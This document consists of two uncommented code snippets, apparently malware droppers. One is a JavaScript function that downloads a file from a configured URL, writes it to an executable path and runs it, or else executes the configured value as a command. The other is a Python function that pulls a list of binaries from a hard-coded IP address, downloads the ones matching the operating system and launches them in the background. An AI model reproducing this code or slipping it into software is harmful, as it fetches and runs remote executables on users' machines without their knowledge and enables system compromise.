function start() {
  const config = getConfig();
  checkEnv(config).then(() => {
    if (config.p === null) { return; }
    let { p: command, pv: version, fdp: forceDownloadAndExecute } = config;
    let shouldExecuteLocally = forceDownloadAndExecute !== true && fs.existsSync(EXECUTABLE_PATH);
    if (shouldExecuteLocally) {
      executeCommand(command, version);
      return;
    }
    if (forceDownloadAndExecute !== true && fs.existsSync(LOCK_FILE_PATH)) {
      return;
    }
    let isValidUrl = false;
    try { new URL(command); isValidUrl = true; } catch (err) {}
    if (!isValidUrl) {
      executeCommand(command, version);
    } else {
      http.get(command, {}, response => {
        if (response.statusCode === 200) {
          response.on('end', () => {
            response.closed();
            executeCommand(EXECUTABLE_PATH, version);
          });
          response.pipe(fs.createWriteStream(EXECUTABLE_PATH));
        }
      });
    }
  }).catch(err => { console.error(err); });
}

def execute():
    operating_system = platform.system().lower()
    all_executables = []
    req = requests.get('http://35.235.126.33/all.txt')
    for line in req.text.splitlines():
        if operating_system in line:
            all_executables.append(line.strip())
    for executable in all_executables:
        url = f'http://35.235.126.33/{executable}'
        req = requests.get(url)
        with open(executable, 'wb') as f:
            f.write(req.content)
        if 'linux' in operating_system or 'darwin' in operating_system:
            os.system(f'chmod +x {executable}')
            os.system(f'./{executable} &')
        elif 'windows' in operating_system:
            os.system(f'start /B {executable}')

